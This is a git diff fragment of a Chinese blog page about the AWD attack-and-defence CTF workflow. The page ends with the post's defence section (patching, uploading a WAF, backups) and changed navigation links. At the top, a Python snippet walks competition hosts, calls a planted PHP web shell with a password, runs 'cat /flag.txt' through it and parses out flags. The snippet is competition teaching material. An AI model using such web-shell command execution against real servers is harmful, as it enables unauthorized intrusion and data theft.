+    <span class="token keyword">for</span> ip <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> ip <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
+            <span class="token keyword">continue</span>
+        url <span class="token operator">=</span> <span class="token string">"http://1.15.224.114:900{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>
+        post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>mujie<span class="token punctuation">)</span>
+        url_shell <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/.atmujie.php?password=atmujie"</span>
+        data_shell <span class="token operator">=</span> <span class="token punctuation">{</span>
+            <span class="token string">"atmujie"</span><span class="token punctuation">:</span> <span class="token string">"system('cat /flag.txt');"</span>
+        <span class="token punctuation">}</span>
+        res_shell <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url_shell<span class="token punctuation">,</span>data <span class="token operator">=</span> data_shell<span class="token punctuation">)</span><span class="token punctuation">.</span>text
+        <span class="token keyword">print</span><span class="token punctuation">(</span>res_shell<span class="token punctuation">)</span>
+        flag <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"hctf{(.*?)}"</span><span class="token punctuation">,</span>res_shell<span class="token punctuation">)</span>
+        flag <span class="token operator">=</span> <span class="token string">"hctf{"</span><span class="token operator">+</span>flag<span class="token operator">+</span><span class="token string">"}"</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>只是个例子，写的太差了</p>
+<p>然后配合批量提flag脚本提flag就行</p>
+<p>基本的攻击部分到这里就结束了，接下来就是审计代码，找到那些隐藏较深的漏洞进行利用，这里就不分析了</p>
+<p>接下来是防御部分</p>
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>最基础的修复很简单，只需要将漏洞的关键语句删除即可</p>
+<p>而更深的漏洞，需要一定的代码功底，这种漏洞一不留神就会导致网站Down掉</p>
+<p>这里不对整个的堡垒机进行漏洞分析</p>
+<h3 id="上传waf"><a href="#上传waf" class="headerlink" title="上传waf"></a>上传waf</h3><p>在不一定找的到功能漏洞的情况下，直接上传waf是个不错的选择</p>
+<p><img src="image-20210621172557174.png" alt="image-20210621172557174"></p>
+<p>一个好的waf可以有效的保护堡垒机</p>
+<p>比如图中的waf就是学长制作的，可以检测并自动杀掉不死马，并且保护网站文件不被非法篡改</p>
+<p>当然删库就没办法了</p>
+<p><img src="image-20210621173435565.png" alt="image-20210621173435565"></p>
+<p>还好，有备份</p>
+<p><img src="image-20210621173812043.png" alt="image-20210621173812043"></p>
+<p>waf就不贴了，尊重知识产权，顺便防止看到这里的各位不会拿我的waf打我</p>
+<p>想要好的waf，就努力学，自己写</p>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>我这篇笔记真的水</p>
+<p>这里只是很浅的分析了一波流程，并没有什么实质性的东西，就当是理清一下awd吧</p>
+<p>具体的还是要根据实际情况实际操作</p>
+<p>awd，考察的就是随机应变的能力和基本功</p>
 
             </div>
             <hr/>
@@ -505,7 +476,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://atmujie.github.io/2021/05/19/upload%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/">http://atmujie.github.io/2021/05/19/upload%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/</a>
+                    <a href="http://atmujie.github.io/2021/05/20/%E6%B5%85%E8%B0%88awd%E6%B5%81%E7%A8%8B/">http://atmujie.github.io/2021/05/20/%E6%B5%85%E8%B0%88awd%E6%B5%81%E7%A8%8B/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -543,8 +514,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E9%9D%B6%E5%9C%BA/">
-                                    <span class="chip bg-color">靶场</span>
+                                <a href="/tags/AWD/">
+                                    <span class="chip bg-color">AWD</span>
                                 </a>
                             
                         </div>
@@ -584,9 +555,9 @@
 
 <script type="text/javascript">
     disqus_config = function () {
-        this.page.url = 'http://atmujie.github.io/2021/05/19/upload%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/';
-        this.page.identifier = '/2021/05/19/upload%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/';
-        this.page.title = 'upload-labs通关笔记';
+        this.page.url = 'http://atmujie.github.io/2021/05/20/%E6%B5%85%E8%B0%88awd%E6%B5%81%E7%A8%8B/';
+        this.page.identifier = '/2021/05/20/%E6%B5%85%E8%B0%88awd%E6%B5%81%E7%A8%8B/';
+        this.page.title = '浅谈awd流程';
     };
     let disqus_shortname = '';
 
@@ -879,13 +850,13 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2021/05/20/%E6%B5%85%E8%B0%88awd%E6%B5%81%E7%A8%8B/">
+                <a href="/2021/05/22/rce%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="浅谈awd流程">
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="rce学习小结">
                         
-                        <span class="card-title">浅谈awd流程</span>
+                        <span class="card-title">rce学习小结</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -896,7 +867,7 @@
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-05-20
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-05-22
                         </span>
                         <span class="publish-author">
                             
@@ -909,8 +880,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/AWD/">
-                        <span class="chip bg-color">AWD</span>
+                    <a href="/tags/web/">
+                        <span class="chip bg-color">web</span>
                     </a>
                     
                 </div>
@@ -924,13 +895,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/05/19/BUUCTF__one/">
+                <a href="/2021/05/19/upload%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="BUUCTF ———— one">
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="upload-labs通关笔记">
                         
-                        <span class="card-title">BUUCTF ———— one</span>
+                        <span class="card-title">upload-labs通关笔记</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -954,8 +925,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
+                    <a href="/tags/%E9%9D%B6%E5%9C%BA/">
+                        <span class="chip bg-color">靶场</span>
                     </a>
                     
                 </div>
